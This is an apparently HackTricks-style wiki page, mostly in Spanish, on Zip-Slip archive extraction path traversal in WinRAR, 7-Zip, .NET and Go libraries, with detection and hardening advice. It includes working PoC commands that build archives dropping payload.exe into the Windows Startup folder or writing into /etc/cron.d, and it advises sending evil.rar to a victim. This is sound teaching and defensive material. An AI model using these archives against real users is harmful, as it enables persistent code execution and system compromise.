# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Descripción general

Muchos formatos de archivo (ZIP, RAR, TAR, 7-ZIP, etc.) permiten que cada entrada lleve su propia **ruta interna**. Cuando una utilidad de extracción acata ciegamente esa ruta, un nombre de archivo manipulado que contenga `..` o una **ruta absoluta** (p. ej. `C:\Windows\System32\`) se escribirá fuera del directorio elegido por el usuario.
Esta clase de vulnerabilidad es ampliamente conocida como *Zip-Slip* o **archive extraction path traversal**.

Las consecuencias van desde sobrescribir archivos arbitrarios hasta lograr directamente **remote code execution (RCE)** al dejar un payload en una ubicación de **auto-run** como la carpeta *Startup* de Windows.

## Causa raíz

1. El atacante crea un archivo en el que uno o más encabezados de archivo contienen:
* Secuencias de recorrido relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Rutas absolutas (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* O **symlinks** creados que se resuelven fuera del directorio objetivo (común en ZIP/TAR en *nix*).
2. La víctima extrae el archivo con una herramienta vulnerable que confía en la ruta incrustada (o sigue los symlinks) en lugar de sanitizarla o forzar la extracción dentro del directorio elegido.
3. El archivo se escribe en la ubicación controlada por el atacante y se ejecuta/carga la próxima vez que el sistema o el usuario active esa ruta.

### .NET `Path.Combine` + `ZipArchive` traversal

Un anti-patrón común en .NET es combinar el destino previsto con **controlada por el usuario** `ZipArchiveEntry.FullName` y extraer sin normalizar la ruta:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Si `entry.FullName` comienza con `..\\` se produce path traversal; si es un **absolute path**, el componente izquierdo se descarta por completo, dando lugar a un **arbitrary file write** como identidad de extracción.
- Archivo de prueba de concepto para escribir en un directorio hermano `app` vigilado por un escáner programado:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Colocar ese ZIP en el buzón monitoreado da como resultado `C:\samples\app\0xdf.txt`, confirmando traversal fuera de `C:\samples\queue\` y habilitando primitivas posteriores (p. ej., DLL hijacks).

## Ejemplo del mundo real – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR para Windows (incluyendo la CLI `rar` / `unrar`, la DLL y el código fuente portable) no validaba los nombres de archivo durante la extracción.
Un archivo RAR malicioso que contiene una entrada como:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
terminaría **fuera** del directorio de salida seleccionado y dentro de la carpeta *Startup* del usuario. Al iniciar sesión, Windows ejecuta automáticamente todo lo que haya allí, proporcionando RCE *persistente*.

### Creación de un PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).

Entregar `evil.rar` a la víctima e indicarles que lo extraigan con una versión vulnerable de WinRAR.

### Observed Exploitation in the Wild

ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – List archive entries and flag any name containing `../`, `..\\`, *absolute paths* (`/`, `C:`) or entries of type *symlink* whose target is outside the extraction dir.
* **Canonicalisation** – Ensure `realpath(join(dest, name))` still starts with `dest`. Reject otherwise.
* **Sandbox extraction** – Decompress into a disposable directory using a *safe* extractor (e.g., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) and verify resulting paths stay inside the directory.
* **Endpoint monitoring** – Alert on new executables written to `Startup`/`Run`/`cron` locations shortly after an archive is opened by WinRAR/7-Zip/etc.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+ implement path/symlink sanitisation. Both tools still lack auto-update.
2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” when possible.
3. On Unix, drop privileges & mount a **chroot/namespace** before extraction; on Windows, use **AppContainer** or a sandbox.
4. If writing custom code, normalise with `realpath()`/`PathCanonicalize()` **before** create/write, and reject any entry that escapes the destination.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
